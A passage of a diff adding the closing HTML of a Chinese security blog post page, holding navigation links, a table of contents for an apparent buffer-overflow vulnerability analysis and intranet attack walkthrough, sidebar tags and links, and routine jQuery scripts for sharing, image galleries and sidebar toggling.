+ <a href="/2022/03/10/永恒之蓝内核态shellcode分析/" title="永恒之蓝内核态shellcode分析">
+  <strong>上一篇：</strong><br/>
+  <span>
+  永恒之蓝内核态shellcode分析</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2021/03/05/SUCTF2019AkiraHomework分析文档/"  title="SUCTF2019Akira Homework分析文档">
+ <strong>下一篇：</strong><br/> 
+ <span>SUCTF2019Akira Homework分析文档
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一-漏洞介绍"><span class="toc-number">1.</span> <span class="toc-text">(一)漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二-漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">(二)漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#复现环境"><span class="toc-number">2.1.</span> <span class="toc-text">复现环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#静态分析"><span class="toc-number">2.3.</span> <span class="toc-text">静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NetpwPathCanonicalize"><span class="toc-number">2.3.1.</span> <span class="toc-text">NetpwPathCanonicalize</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CanonicalizePathName"><span class="toc-number">2.3.2.</span> <span class="toc-text">CanonicalizePathName</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RemoveLegacyFolder"><span class="toc-number">2.3.3.</span> <span class="toc-text">RemoveLegacyFolder</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#第一次移除经典路径"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">第一次移除经典路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#第二次移除经典路径"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">第二次移除经典路径</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#动态调试"><span class="toc-number">2.4.</span> <span class="toc-text">动态调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#本地溢出调试"><span class="toc-number">2.4.1.</span> <span class="toc-text">本地溢出调试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#环境配置"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#动态分析溢出流程"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">动态分析溢出流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#内存布局分析"><span class="toc-number">2.4.1.3.</span> <span class="toc-text">内存布局分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#字符产生的原因"><span class="toc-number">2.4.1.4.</span> <span class="toc-text">\字符产生的原因</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#远程溢出调试"><span class="toc-number">2.4.2.</span> <span class="toc-text">远程溢出调试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#环境配置-1"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#动态分析溢出流程-1"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">动态分析溢出流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#字符产生的原因-1"><span class="toc-number">2.4.2.3.</span> <span class="toc-text">\字符产生的原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#突破DEP"><span class="toc-number">2.4.2.4.</span> <span class="toc-text">突破DEP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#内存布局分析-1"><span class="toc-number">2.4.2.5.</span> <span class="toc-text">内存布局分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考文章"><span class="toc-number">2.4.3.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三-思路拓展：流量侧绕过"><span class="toc-number">3.</span> <span class="toc-text">(三)思路拓展：流量侧绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#思路一：利用与漏洞产生原理变换绕过检测特征"><span class="toc-number">3.1.</span> <span class="toc-text">思路一：利用与漏洞产生原理变换绕过检测特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#思路二：流量请求测绕过"><span class="toc-number">3.2.</span> <span class="toc-text">思路二：流量请求测绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四-应用场景：针对内网目标"><span class="toc-number">4.</span> <span class="toc-text">(四)应用场景：针对内网目标</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#拓扑"><span class="toc-number">4.1.</span> <span class="toc-text">拓扑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#场景描述"><span class="toc-number">4.2.</span> <span class="toc-text">场景描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击流程"><span class="toc-number">4.3.</span> <span class="toc-text">攻击流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#思路分析"><span class="toc-number">4.4.</span> <span class="toc-text">思路分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#具体实施"><span class="toc-number">4.5.</span> <span class="toc-text">具体实施</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#smb服务转发"><span class="toc-number">4.5.1.</span> <span class="toc-text">smb服务转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#正反向shell转发"><span class="toc-number">4.5.2.</span> <span class="toc-text">正反向shell转发</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#single-payload-windows-shell-bind-tcp"><span class="toc-number">4.5.2.1.</span> <span class="toc-text">single: payload/windows/shell_bind_tcp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#single-payload-windows-shell-reverse-tcp"><span class="toc-number">4.5.2.2.</span> <span class="toc-text">single: payload/windows/shell_reverse_tcp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考文章-1"><span class="toc-number">4.6.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/安全竞赛/" title="安全竞赛">安全竞赛<sup>26</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/编程开发/" title="编程开发">编程开发<sup>19</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/docker/" title="docker">docker<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Writeup/" title="Writeup">Writeup<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/python/" title="python">python<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/redis/" title="redis">redis<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/山东省大学生信息安全竞赛/" title="山东省大学生信息安全竞赛">山东省大学生信息安全竞赛<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/汇编/" title="汇编">汇编<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/学习笔记/" title="学习笔记">学习笔记<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Docker/" title="Docker">Docker<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/自动化/" title="自动化">自动化<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/shellcode/" title="shellcode">shellcode<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/PE/" title="PE">PE<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/综合渗透/" title="综合渗透">综合渗透<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/铁人三项/" title="铁人三项">铁人三项<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻击脚本/" title="攻击脚本">攻击脚本<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/安恒杯Web安全测试大赛/" title="安恒杯Web安全测试大赛">安恒杯Web安全测试大赛<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/XAMPP/" title="XAMPP">XAMPP<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/error/" title="error">error<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/流量混淆/" title="流量混淆">流量混淆<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cve-2019-0708/" title="cve_2019_0708">cve_2019_0708<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://blog.scanxx.com/" target="_blank" title="scanxx">scanxx</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.ccdebug.com/" target="_blank" title="ccdebug">ccdebug</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://y-y-k.tk/" target="_blank" title="y-y-k">y-y-k</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://0clickjacking0.github.io/" target="_blank" title="xianyu123">xianyu123</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.virtua1.cn" target="_blank" title="Virtua1">Virtua1</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://v0w.top" target="_blank" title="V0W">V0W</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.cnblogs.com/test404" target="_blank" title="胖虎">胖虎</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://p0desta.com" target="_blank" title="p0desta">p0desta</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.test407.cn" target="_blank" title="薯片博客">薯片博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://alem0n.github.io" target="_blank" title="lem0n">lem0n</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> Rise and rise again until lambs become lions <br/>
+			Everyone can cook, but only those who dare to try can become the real chef.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		<a href="https://github.com/flag0" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:root@flag0.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2022 
+		
+		<a href="/about" target="_blank" title="flag0">flag0</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
